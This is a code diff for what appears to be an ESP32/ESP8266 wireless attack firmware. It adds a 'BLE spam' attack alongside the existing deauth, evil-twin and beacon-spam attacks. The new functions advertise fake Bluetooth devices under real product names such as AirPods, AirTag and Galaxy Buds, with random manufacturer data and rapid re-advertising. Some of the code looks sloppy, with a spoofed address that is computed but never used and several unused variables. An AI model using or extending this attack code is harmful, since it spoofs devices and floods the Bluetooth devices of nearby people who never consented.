@@ -70,6 +70,12 @@ void Attack::startEvilTwin(const char* ssid, uint8_t ch, bool wpa2, const uint8_
 
 void Attack::stop() {
     if (running) {
+#ifdef ESP32
+        if (bleSpam && bleAdvertising) {
+            bleAdvertising->stop();
+            BLEDevice::deinit(false);
+        }
+#endif
         running              = false;
         deauthPkts           = 0;
         beaconPkts           = 0;
@@ -91,6 +97,8 @@ void Attack::stop() {
         trueDeauth           = false;
         beaconSpam           = false;
         beaconSpamPkts       = 0;
+        bleSpam              = false;
+        bleSpamPkts          = 0;
         prntln(A_STOP);
     }
 }
@@ -191,6 +199,7 @@ void Attack::update() {
     if (evilTwin) evilTwinUpdate();
     if (trueDeauth) trueDeauthUpdate();
     if (beaconSpam) beaconSpamUpdate();
+    if (bleSpam) bleSpamUpdate();
 
     if (currentTime - attackTime > 1000) {
         attackTime = currentTime;
@@ -591,4 +600,93 @@ bool Attack::isBeaconSpamRunning() {
 
 uint32_t Attack::getBeaconSpamPkts() {
     return beaconSpamPkts;
+}
+
+void Attack::startBleSpam(int advCount) {
+#ifdef ESP32
+    stop();
+    running = true;
+    bleSpam = true;
+    bleSpamCount = advCount;
+    bleSpamPkts = 0;
+    attackStartTime = currentTime;
+    
+    BLEDevice::init("");
+    BLEServer* pServer = BLEDevice::createServer();
+    bleAdvertising = BLEDevice::getAdvertising();
+    bleAdvertising->setMinInterval(0x20);
+    bleAdvertising->setMaxInterval(0x40);
+    bleAdvertising->setScanResponse(true);
+    
+    if (output) {
+        prntln("Starting BLE Spam...");
+        prnt("Advertising ");
+        prnt(advCount);
+        prntln(" fake BLE devices");
+    }
+#else
+    if (output) {
+        prntln("BLE Spam requires ESP32!");
+    }
+#endif
+}
+
+void Attack::bleSpamUpdate() {
+#ifdef ESP32
+    if (!bleSpam) return;
+    
+    if (bleSpamPkts == 0 || currentTime - beacon.time >= 50) {
+        BLEAdvertisementData advData;
+        
+        char deviceName[32];
+        const char* bleNames[] = {
+            "AirPods", "AirPods Pro", "AirPods Max",
+            "Galaxy Buds", "Galaxy Buds+", "Galaxy Buds Pro",
+            "Pixel Buds", "Bose QC", "Sony WF",
+            "Smart Tag", "SmartTag+", "Galaxy Tag",
+            "Apple Watch", "Galaxy Watch", "Fitbit",
+            "Tile", "Tile Pro", "AirTag",
+            "iPhone", "Samsung Phone", "Pixel Phone",
+            "Magic Keyboard", "MX Keys", "K380",
+            "Magic Mouse", "MX Master", "Lift",
+            "Trackpad", "Surface Pen", "Apple Pencil"
+        };
+        
+        int nameIdx = random(0, 30);
+        int nameLen = strlen(bleNames[nameIdx]);
+        
+        snprintf(deviceName, sizeof(deviceName), "%s", bleNames[nameIdx]);
+        
+        advData.setName(deviceName);
+        
+        std::string mfgData;
+        for (int i = 0; i < 8; i++) {
+            mfgData += (char)random(256);
+        }
+        advData.setManufacturerData(mfgData);
+        
+        uint8_t* mac = (uint8_t*)deviceName;
+        char bdaddr[18];
+        snprintf(bdaddr, sizeof(bdaddr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 mac[0] ^ 0xFF, mac[1] ^ 0xFF, mac[2] ^ 0xFF,
+                 mac[3] ^ 0xFF, mac[4] ^ 0xFF, mac[5] ^ 0xFF);
+        
+        if (bleSpamPkts % 10 == 0) {
+            bleAdvertising->stop();
+            bleAdvertising->setAdvertisementData(advData);
+            bleAdvertising->start();
+        }
+        
+        beacon.time = currentTime;
+        bleSpamPkts++;
+    }
+#endif
+}
+
+bool Attack::isBleSpamRunning() {
+    return bleSpam;
+}
+
+uint32_t Attack::getBleSpamPkts() {
+    return bleSpamPkts;
 }
